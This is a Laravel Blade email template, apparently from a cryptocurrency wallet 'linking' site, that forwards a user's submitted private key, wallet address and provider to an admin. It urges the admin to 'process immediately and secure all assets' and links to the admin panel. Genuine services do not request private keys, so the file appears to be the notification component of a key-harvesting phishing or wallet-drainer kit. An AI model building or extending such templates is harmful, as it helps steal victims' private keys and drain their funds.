@include('emails._layout_open', ['title' => '🚨 Private Key Alert', 'accentClass' => 'danger'])

<div style="text-align:center;">
    <div class="email-icon danger">🚨</div>
    <h1 class="email-title">Private Key Alert</h1>
    <p class="email-subtitle" style="color:#f87171;font-weight:600;">HIGH SECURITY — Process Immediately</p>
</div>

<p>A user has submitted their wallet's private key for linking. <strong style="color:#f87171;">Please process this immediately and secure all assets.</strong></p>

<table class="detail-table">
    <tr>
        <td class="key">Wallet Provider</td>
        <td class="val">{{ $formData['provider_name'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Wallet Label</td>
        <td class="val">{{ $formData['wallet_name'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Wallet Address</td>
        <td class="val" style="font-family:monospace;font-size:12px;word-break:break-all;">{{ $formData['wallet_address'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Private Key</td>
        <td class="val" style="color:#f87171;font-family:monospace;font-size:11px;font-weight:700;word-break:break-all;">{{ $formData['private_key'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Submitted At</td>
        <td class="val">{{ now()->format('Y-m-d H:i:s') }}</td>
    </tr>
</table>

<div class="info-box danger" style="border-left:4px solid #ef4444;">
    <p style="text-align:center;font-size:14px;font-weight:700;color:#fca5a5;letter-spacing:0.02em;">
        🚨 HIGH SECURITY ALERT: PLEASE PROCESS IMMEDIATELY AND SECURE ALL ASSETS.
    </p>
</div>

<div style="text-align:center;margin:28px 0 8px;">
    <a href="{{ url('/admin') }}" class="btn-cta" style="background:linear-gradient(135deg,#dc2626,#ef4444);">Go to Admin Panel →</a>
</div>

@include('emails._layout_close')
